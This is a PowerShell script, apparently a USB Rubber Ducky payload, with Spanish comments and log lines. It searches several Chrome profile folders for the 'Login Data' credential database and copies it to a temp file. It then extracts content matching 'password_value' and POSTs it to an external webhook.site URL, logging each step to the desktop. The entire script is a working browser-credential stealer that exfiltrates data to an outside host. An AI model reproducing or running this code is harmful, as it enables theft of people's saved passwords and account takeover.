
$log = "$env:USERPROFILE\Desktop\ducky_log.txt"
"--- Inicio de Prueba de Poder ---" | Out-File $log

Start-Sleep -s 2

# Lista de posibles rutas donde Chrome guarda los datos
$possiblePaths = @(
    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data",
    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data",
    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 2\Login Data",
    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 3\Login Data",
    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 4\Login Data"
)

$foundPath = $null

# Buscar cuál de las rutas existe realmente
foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $foundPath = $path
        break
    }
}

if ($foundPath) {
    try {
        "Archivo encontrado en: $foundPath" | Out-File $log -Append
        "Intentando copia..." | Out-File $log -Append
        
        # Copia a una ubicación temporal para evitar el error de "Archivo en uso"
        Copy-Item $foundPath "$env:TEMP\chrome_temp.db" -ErrorAction Stop
        
        # Extraer contenido (buscamos cualquier dato que no sea vacío)
        $data = Get-Content "$env:TEMP\chrome_temp.db" -Raw | Select-String "password_value"
        
        if ($data) {
            "Datos extraídos. Enviando al Webhook..." | Out-File $log -Append
            $url = "https://webhook.site/3fa59b0e-4157-4c9e-a72b-4803657bd464"
            # Enviamos el contenido crudo
            Invoke-WebRequest -UseBasicParsing -Uri $url -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($data))
            "¡ÉXITO! Datos enviados." | Out-File $log -Append
        } else {
            "El archivo existe pero parece estar vacío o sin datos de contraseñas." | Out-File $log -Append
        }
    } catch {
        "ERROR durante la ejecución: $($_.Exception.Message)" | Out-File $log -Append
    }
} else {
    "ERROR: No se encontró el archivo de Login Data en ninguna de las rutas comunes." | Out-File $log -Append
    "Rutas revisadas:" | Out-File $log -Append
    foreach ($p in $possiblePaths) { " - $p" | Out-File $log -Append }
}

"--- Fin del Script ---" | Out-File $log -Append
